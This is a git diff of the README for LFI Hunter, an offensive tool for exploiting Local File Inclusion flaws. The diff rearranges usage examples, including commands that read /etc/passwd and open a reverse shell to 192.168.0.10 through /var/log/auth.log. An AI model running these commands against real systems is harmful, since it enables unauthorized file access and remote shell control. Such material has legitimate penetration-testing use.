@@ -54,83 +54,6 @@ LFI_Hunter [OPTIONS]
 | `-Z`, `--fuzzing`       | Enable brute-force or fuzzing mode for parameter testing.                                      |
 | `--config FILE`         | Use a configuration file with predefined options.                                              |
 
-### Examples
-
-1. **Basic URL Scan with Authentication**:
-   ```bash
-   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt --auth -A -LU http://example.com/login.php -U admin -P password
-   ```
-
-2. **Use Base64 Decoding**:
-   ```bash
-   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -B -Z
-   ```
-
-3. **Read /etc/passwd File**:
-   ```bash
-   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -R /etc/passwd
-   ```
-
-4. **Setup Reverse Shell**:
-   ```bash
-   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -R /var/log/auth.log -S 192.168.0.10 --port 5555
-   ```
-
-## Make
-
-LFI Hunter is designed to detect various vulnerabilities related to Local File Inclusion (LFI) in web applications. The most common vulnerabilities that it can identify include:
-
-1. **Basic Local File Inclusion (LFI)**:
-   - LFI vulnerabilities allow attackers to include files on a server through the web browser. This can lead to unauthorized access to sensitive files, such as configuration files or logs.
-
-2. **Authenticated LFI**:
-   - The tool can test areas of an application that require user authentication, allowing it to exploit LFI vulnerabilities in restricted sections of a web application.
-
-3. **Path Traversal Vulnerabilities**:
-   - By manipulating input parameters, LFI Hunter can identify path traversal vulnerabilities, which enable attackers to access files outside the intended directory.
-
-4. **File Inclusion with PHP Filters**:
-   - The tool can utilize PHP filters (e.g., `php://filter`) to decode base64-encoded content or read files in a way that bypasses certain security measures.
-
-6. **Fuzzing for Parameter Injection**:
-   - LFI Hunter supports parameter fuzzing, which helps detect injection vulnerabilities by testing various payloads against input fields.
-
-7. **Reverse Shell Setup**:
-   - The tool can establish a reverse shell connection if the target is vulnerable, allowing for deeper exploitation and further testing.
-
-By leveraging these capabilities, LFI Hunter assists ethical hackers and security researchers in identifying and exploiting LFI vulnerabilities effectively in web applications.
-
-# README.md for LFI Hunter
-
-## Overview
-
-**LFI Hunter** is a command-line tool designed for testing and exploiting Local File Inclusion (LFI) vulnerabilities in web applications. This tool assists ethical hackers and security researchers in assessing web application security by exploiting file inclusion vulnerabilities in a controlled environment.
-
-## Features
-
-- **Command-line Interface**: User-friendly interface with various options.
-- **Authentication Support**: Test areas requiring login credentials.
-- **File Reading**: Attempt to read sensitive files from the target machine.
-- **Parameter Fuzzing**: Test for injection vulnerabilities.
-- **Reverse Shell Setup**: Establish a reverse shell connection for deeper access.
-- **Aggressive Mode**: Increase request speed and payload variation for more effective testing.
-
-## Installation
-
-To use LFI Hunter, clone the repository from GitHub:
-
-```bash
-git clone https://github.com/jac11/LFI_Hunter.git
-cd LFI_Hunter
-```
-
-## Usage
-
-The basic syntax for running LFI Hunter is:
-
-```bash
-LFI_Hunter [OPTIONS]
-```
 
 ### Key Options for Authentication
 
@@ -204,11 +127,28 @@ In this command:
 - `-A` activates aggressive mode.
 - `--auth` allows interaction with authenticated sections of the application.
 
-## Exit Status
+### Examples
 
-- **0**: Successful execution.
-- **1**: General error, such as invalid command input.
-- **2**: Misuse of command options.
+1. **Basic URL Scan with Authentication**:
+   ```bash
+   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt --auth -A -LU http://example.com/login.php -U admin -P password
+   ```
+
+2. **Use Base64 Decoding**:
+   ```bash
+   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -B -Z
+   ```
+
+3. **Read /etc/passwd File**:
+   ```bash
+   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -R /etc/passwd
+   ```
+
+4. **Setup Reverse Shell**:
+   ```bash
+   LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -R /var/log/auth.log -S 192.168.0.10 --port 5555
+   ```
+
 
 ## Files
 
@@ -227,6 +167,3 @@ LFI Hunter is licensed for user use only, with no permission to modify any sourc
 ---
 
 This README provides a comprehensive overview of how to install and use LFI Hunter effectively while highlighting its capabilities regarding authentication and aggressive mode operations.
-
-Citations:
-[1] https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/39151810/86d7026d-1fc5-4a40-a4fa-d3debb3714d7/lfi_info.py
